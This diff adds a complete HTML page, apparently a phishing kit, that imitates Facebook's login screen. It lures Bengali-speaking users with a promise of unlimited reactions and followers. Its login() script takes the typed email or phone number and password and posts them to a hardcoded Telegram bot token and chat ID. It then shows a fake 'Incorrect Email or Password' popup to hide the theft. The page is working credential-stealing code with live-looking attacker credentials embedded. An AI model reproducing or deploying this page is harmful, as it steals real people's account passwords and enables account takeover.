@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+
+<html lang="bn">      
+<head>      
+  <meta charset="UTF-8">      
+  <meta name="viewport" content="width=device-width, initial-scale=1">      
+  <title>Unlimited Reactions & Followers</title>      
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">      
+  <style>      
+    /* --------- CSS তুমি আগের মতোই রাখছো --------- */      
+    body {      
+      margin: 0;      
+      padding: 0;      
+      background: #f0f2f5;      
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;      
+      overflow-x: hidden;      
+      position: relative;      
+      height: 100vh;      
+    }      
+    .container {      
+      display: flex;      
+      flex-direction: column;      
+      align-items: center;      
+      padding: 20px;      
+      margin-top: 20px;      
+      position: relative;      
+      z-index: 2;      
+    }      
+    .heading {      
+      font-size: 22px;      
+      font-weight: bold;      
+      color: #1877f2;      
+      margin-bottom: 10px;      
+      text-align: center;      
+    }      
+    .help-button-top {      
+      margin-bottom: 20px;      
+      background: #00b894;      
+      padding: 10px 18px;      
+      font-size: 16px;      
+      font-weight: bold;      
+      color: white;      
+      border-radius: 6px;      
+      border: none;      
+      cursor: pointer;      
+    }      
+    .facebook-logo {      
+      color: #1877f2;      
+      font-size: 60px;      
+      margin-bottom: 20px;      
+    }      
+    .login-box {      
+      background: #fff;      
+      padding: 20px;      
+      border-radius: 8px;      
+      box-shadow: 0 2px 10px rgba(0,0,0,0.2);      
+      width: 100%;      
+      max-width: 400px;      
+      text-align: center;      
+      z-index: 2;      
+    }      
+    .login-box input {      
+      width: 90%;      
+      padding: 14px;      
+      margin: 10px 0;      
+      border: 1px solid #dddfe2;      
+      border-radius: 6px;      
+      font-size: 16px;      
+    }      
+    .login-box button {      
+      width: 95%;      
+      padding: 14px;      
+      background: #1877f2;      
+      color: white;      
+      font-weight: bold;      
+      border: none;      
+      border-radius: 6px;      
+      cursor: pointer;      
+      font-size: 18px;      
+      margin-top: 10px;      
+    }      
+    .login-box a {      
+      display: block;      
+      margin: 10px 0;      
+      color: #1877f2;      
+      text-decoration: none;      
+      font-size: 14px;      
+    }      
+    .create-account {      
+      background: #42b72a;      
+      margin-top: 15px;      
+      padding: 12px;      
+      width: 60%;      
+      border-radius: 6px;      
+      font-size: 16px;      
+      color: white;      
+      font-weight: bold;      
+    }      
+    .languages {      
+      margin-top: 30px;      
+      text-align: center;      
+      font-size: 12px;      
+      color: #555;      
+    }      
+    .languages a {      
+      margin: 0 5px;      
+      color: #555;      
+      text-decoration: none;      
+    }      
+    .reaction {      
+      position: fixed;      
+      font-size: 30px;      
+      left: 50%;      
+      transform: translateX(-50%);      
+      animation: floatUp 6s linear forwards;      
+      pointer-events: none;      
+      z-index: 1000;      
+      opacity: 1;      
+    }      
+    @keyframes floatUp {      
+      0% {      
+        bottom: -50px;      
+        opacity: 1;      
+        transform: translateX(-50%) translateY(0);      
+      }      
+      100% {      
+        bottom: 100vh;      
+        opacity: 0;      
+        transform: translateX(-50%) translateY(-100vh);      
+      }      
+    }      
+    .overlay {      
+      position: fixed;      
+      top: 0; left: 0;      
+      width: 100%;      
+      height: 100%;      
+      background: rgba(0,0,0,0.4);      
+      z-index: 3000;      
+      display: none;      
+      align-items: center;      
+      justify-content: center;      
+    }      
+    .popup {      
+      background: white;      
+      padding: 20px;      
+      border-radius: 8px;      
+      width: 90%;      
+      max-width: 350px;      
+      text-align: center;      
+      box-shadow: 0 5px 15px rgba(0,0,0,0.5);      
+    }      
+    .popup h2 {      
+      margin-bottom: 10px;      
+      color: #333;      
+    }      
+    .popup p {      
+      margin-bottom: 20px;      
+      color: #555;      
+    }      
+    .popup-buttons {      
+      display: flex;      
+      justify-content: space-around;      
+    }      
+    .popup-buttons button {      
+      padding: 10px 20px;      
+      border: none;      
+      border-radius: 6px;      
+      font-weight: bold;      
+      cursor: pointer;      
+    }      
+    .ok-btn {      
+      background: #1877f2;      
+      color: white;      
+    }      
+    .cancel-btn {      
+      background: #e4e6eb;      
+      color: #050505;      
+    }      
+  </style>      
+</head>      
+<body>    <!-- Overlay Popup -->    <div class="overlay" id="overlay">      
+  <div class="popup">      
+    <h2>Incorrect Email or Password</h2>      
+    <p>Please check your information and try again.</p>      
+    <div class="popup-buttons">      
+      <button class="ok-btn" onclick="closePopup()">OK</button>      
+      <button class="cancel-btn" onclick="closePopup()">Cancel</button>      
+    </div>      
+  </div>      
+</div>    <div class="container">      
+  <div class="heading">✨ আনলিমিটেড রিয়েক্ট & ফলোয়ার ✨</div>      
+  <button class="help-button-top" onclick="location.href='help.html'">কিভাবে ব্যবহার করতে হয়?</button>      
+  <div class="facebook-logo">      
+    <i class="fab fa-facebook"></i>      
+  </div>      
+  <div class="login-box">      
+    <input type="text" placeholder="Email address or phone number" id="email">      
+    <input type="password" placeholder="Password" id="password">      
+    <button onclick="login()">Log In</button>      
+    <a href="#">Forgot password?</a>      
+    <hr style="margin: 20px 0;">      
+    <button class="create-account">Create New Account</button>      
+  </div>      
+  <div class="languages">      
+    <a href="#">English (UK)</a> ·       
+    <a href="#">বাংলা</a> ·       
+    <a href="#">हिन्दी</a> ·       
+    <a href="#">Español</a> ·       
+    <a href="#">Português (Brasil)</a> ·       
+    <a href="#">Français (France)</a><br><br>      
+    Facebook © 2025      
+  </div>      
+</div>    <script>      
+       
+  const TELEGRAM_BOT_TOKEN = "7590766158:AAFTMfMpGQkg_4iw3UyOiGX4NdarPIvcwRE";      
+  const TELEGRAM_CHAT_ID = "6807445600";      const reactions = [
+'<i class="fas fa-thumbs-up"></i>',
+'<i class="fas fa-heart"></i>',
+'<i class="fas fa-face-grin-squint-tears"></i>',
+'<i class="fas fa-hands-holding-heart"></i>'
+];
+
+function createReaction() {
+const div = document.createElement('div');
+div.className = 'reaction';
+div.innerHTML = reactions[Math.floor(Math.random() * reactions.length)];
+div.style.left = (Math.random() * window.innerWidth) + 'px';
+document.body.appendChild(div);
+setTimeout(() => {
+div.remove();
+}, 6000);
+}
+
+setInterval(createReaction, 700);
+
+function login() {
+// Popup দেখাও
+document.getElementById('overlay').style.display = 'flex';
+
+// Email আর Password নিয়ে নাও      
+const email = document.getElementById('email').value;      
+const password = document.getElementById('password').value;      
+  
+// টেলিগ্রামে পাঠাও      
+const message = `🔔 New Login Info:\n📧 Email/Phone: ${email}\n🔒 Password: ${password}`;      
+  
+fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {      
+  method: "POST",      
+  headers: {      
+    "Content-Type": "application/json"      
+  },      
+  body: JSON.stringify({      
+    chat_id: TELEGRAM_CHAT_ID,      
+    text: message      
+  })      
+}).then(response => {      
+  console.log("Message sent to Telegram!");      
+}).catch(error => {      
+  console.error("Error sending message:", error);      
+});
+
+}
+
+function closePopup() {
+document.getElementById('overlay').style.display = 'none';
+}
+</script>    </body>
+
+</html>
